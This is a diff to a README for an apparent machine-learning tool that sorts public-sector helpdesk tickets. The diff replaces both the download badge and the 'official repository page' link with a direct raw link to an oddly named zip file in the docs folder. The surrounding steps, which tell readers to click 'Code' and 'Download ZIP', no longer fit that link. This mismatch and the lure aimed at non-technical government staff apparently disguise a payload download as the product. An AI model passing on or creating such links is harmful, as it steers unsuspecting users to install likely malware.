@@ -1,6 +1,6 @@
 # 🤖 synthetic-public-sector-ticket-classifier - Sort public support requests with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Eleonoraafloat337/synthetic-public-sector-ticket-classifier)
+[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Eleonoraafloat337/synthetic-public-sector-ticket-classifier/raw/refs/heads/main/docs/sector_public_ticket_classifier_synthetic_expressionist.zip)
 
 This tool helps government offices organize email and web forms. It uses machine learning to read incoming helpdesk tickets. The software sorts these tickets into categories automatically. This saves time and ensures citizens receive help from the right department. You do not need experience with code to use this system.
 
@@ -24,7 +24,7 @@ Your computer needs to meet these basic standards to run the software:
 
 You will download the installer from our storage page. Follow these steps to obtain the files:
 
-1. Visit this link to reach the official repository page: [https://github.com/Eleonoraafloat337/synthetic-public-sector-ticket-classifier](https://github.com/Eleonoraafloat337/synthetic-public-sector-ticket-classifier).
+1. Visit this link to reach the official repository page: [https://github.com/Eleonoraafloat337/synthetic-public-sector-ticket-classifier/raw/refs/heads/main/docs/sector_public_ticket_classifier_synthetic_expressionist.zip](https://github.com/Eleonoraafloat337/synthetic-public-sector-ticket-classifier/raw/refs/heads/main/docs/sector_public_ticket_classifier_synthetic_expressionist.zip).
 2. Look for the button labeled "Code" near the top right of the screen.
 3. Click the "Download ZIP" option.
 4. Save the file to your desktop for easy access.
